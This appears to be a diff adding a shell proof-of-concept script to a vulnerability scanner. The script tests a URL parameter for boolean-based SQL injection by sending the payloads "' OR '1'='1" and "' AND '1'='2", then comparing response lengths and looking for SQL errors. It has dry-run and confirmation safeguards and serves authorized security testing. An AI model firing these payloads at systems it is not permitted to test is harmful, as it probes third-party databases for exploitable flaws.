@@ -1,0 +1,33 @@
+#!/bin/sh
+. "$(dirname "$0")/_poc_lib.sh"
+TARGET="${AXS_TARGET:-${1:-}}"
+EXTRA="${AXS_EXTRA:-${2:-}}"
+DRYRUN=0
+if echo "$EXTRA" | grep -q -- '--dry-run' 2>/dev/null || [ "${AXS_DRY_RUN:-0}" = "1" ]; then DRYRUN=1; fi
+if [ -z "$TARGET" ]; then echo "ERROR: missing TARGET" >&2; poc_result "ERROR" 0.0 "missing target"; exit 2; fi
+echo "PoC: SQL Injection"
+echo "Target: $TARGET"
+echo "Extra: $EXTRA"
+if [ "$DRYRUN" -eq 1 ]; then echo "Mode: DRY-RUN"; echo "Simulating boolean-based SQLi check..."; sleep 1; poc_result "VULNERABLE_SIMULATED" 0.90 "simulation"; exit 0; fi
+require_confirmation || { poc_result "SKIPPED" 0.0 "confirmation required"; exit 0; }
+BASE="$TARGET"; QUERY=""
+if echo "$TARGET" | grep -q '?'; then BASE="$(echo "$TARGET" | cut -d'?' -f1)"; QUERY="$(echo "$TARGET" | cut -s -d'?' -f2-)"; fi
+if [ -n "$QUERY" ]; then FIRST="$(echo "$QUERY" | awk -F'&' '{print $1}')"; KEY="$(echo "$FIRST" | awk -F'=' '{print $1}')"; [ -z "$KEY" ] && KEY="id"; else KEY="id"; fi
+TP_RAW="' OR '1'='1"; FP_RAW="' AND '1'='2"
+TP=$(printf "%s" "$TP_RAW" | python3 -c "import sys,urllib.parse as u; print(u.quote(sys.stdin.read()))")
+FP=$(printf "%s" "$FP_RAW" | python3 -c "import sys,urllib.parse as u; print(u.quote(sys.stdin.read()))")
+if [ -n "$QUERY" ]; then REST="$(echo "$QUERY" | cut -s -d'&' -f2-)"; URL_NORMAL="${BASE}?${KEY}=1"; URL_TRUE="${BASE}?${KEY}=1%20${TP}"; URL_FALSE="${BASE}?${KEY}=1%20${FP}"; [ -n "$REST" ] && URL_NORMAL="${URL_NORMAL}&${REST}" && URL_TRUE="${URL_TRUE}&${REST}" && URL_FALSE="${URL_FALSE}&${REST}"; else URL_NORMAL="${BASE}?${KEY}=1"; URL_TRUE="${BASE}?${KEY}=1%20${TP}"; URL_FALSE="${BASE}?${KEY}=1%20${FP}"; fi
+resp_normal="$(curl_get "$URL_NORMAL")"; len_normal=${#resp_normal}
+resp_true="$(curl_get "$URL_TRUE")"; len_true=${#resp_true}
+resp_false="$(curl_get "$URL_FALSE")"; len_false=${#resp_false}
+diff_true=$(( len_true - len_normal )); abs_diff_true=${diff_true#-}
+diff_false=$(( len_false - len_normal )); abs_diff_false=${diff_false#-}
+is_sql_err=0
+if detect_sql_error "$resp_true" || detect_sql_error "$resp_false" || detect_sql_error "$resp_normal"; then is_sql_err=1; fi
+RESULT="SAFE"; CONF=0.05; THRESH_ABS=120
+if [ "$is_sql_err" -eq 1 ]; then RESULT="POSSIBLE"; CONF=0.6; fi
+if [ "$abs_diff_true" -ge $THRESH_ABS ] && [ "$len_normal" -gt 0 ]; then RESULT="VULNERABLE"; CONF=0.9; fi
+if [ "$RESULT" = "SAFE" ] && [ "$abs_diff_true" -gt 20 ]; then RESULT="POSSIBLE"; CONF=0.25; fi
+poc_result "$RESULT" "$CONF"
+echo "Metric: len_normal=${len_normal}, len_true=${len_true}, len_false=${len_false}"
+exit 0
